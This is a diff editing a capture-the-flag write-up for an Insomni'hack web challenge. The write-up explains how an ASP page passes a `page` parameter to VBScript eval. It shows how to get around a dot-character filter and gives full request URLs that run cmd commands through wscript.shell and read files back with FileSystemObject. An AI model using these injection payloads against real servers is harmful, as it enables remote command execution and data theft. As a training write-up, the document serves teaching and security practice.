@@ -7,13 +7,15 @@ Solves: 22 / Points: 137
 
 ## Challenge description
 ```
-FIXME The developer thinks he is good, show him he is not by grabbing the flag.
+The admin of this site thinks he's a good dev. Just show him he's not by retrieving the flag on his server!
 ```
 
-## Challenge resolution
-The website has a single input, the `page` parameter. After playing with this input, the server returns a VBscript compilation error.
+We start with a URL: http://vbaby.insomni.hack
 
-After some research, we find out that the server is performing an `EVAL` call on the provided input. However, the "dot" (.) character is filtered.
+## Challenge resolution
+The website has a single input, the `page` GET parameter. After playing and manually fuzzing this input, the server returns a VBscript compilation error.
+
+After some research, we find out that the server is performing an `eval` call on the provided input. However, the dot (.) character is filtered.
 
 We can use two different technics to bypass the dot filter:
 1. using `Chr(46)` and concatenation character `&`.
@@ -25,7 +27,7 @@ First, we list files and folders within `C:\` by running `cmd /c dir C:\>C:\temp
 ```
 http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("wscript.shell").Run("cmd+/c+dir+C:\>C:\temp\dir.txt")
 ```
-We read the content of `C:\temp\dir.txt` with:
+Then, we read the content of `C:\temp\dir.txt` with:
 ```
 http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("scripting.FileSystemObject").OpenTextFile("C:\temp\dir.txt").ReadAll
 ```
